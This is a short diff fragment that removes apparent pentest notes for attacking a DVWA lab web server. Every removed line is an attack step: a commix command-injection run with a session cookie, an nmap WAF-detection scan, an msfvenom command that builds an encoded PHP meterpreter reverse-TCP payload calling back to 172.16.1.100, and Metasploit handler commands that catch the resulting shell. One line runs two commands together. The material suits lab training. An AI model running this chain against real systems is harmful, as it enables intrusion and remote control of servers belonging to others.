@@ -1,9 +1,0 @@
-commix -u http://172.16.1.102/dvwa/vulnerabilities/exec/ --cookie='PHPSESSID=ba245268c2d2c08a209bf7db8bd004a0; security=low' --data='ip=127.0.0.1&submit=submit'
-whoami
-www-datanmap -p80,443 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.detectBodyChanges" targetWebsite.com
-uname -a
-msfvenom -p php/meterpreter/reverse_tcp lhost=172.16.1.100 lport=4321 -e php/base64 -f raw > payload.php
-nano payload.php and add <?php at the beginning of the file and ?>
-use exploit/multi/handler
-set payload php/meterpreter/reverse_tcp
-run
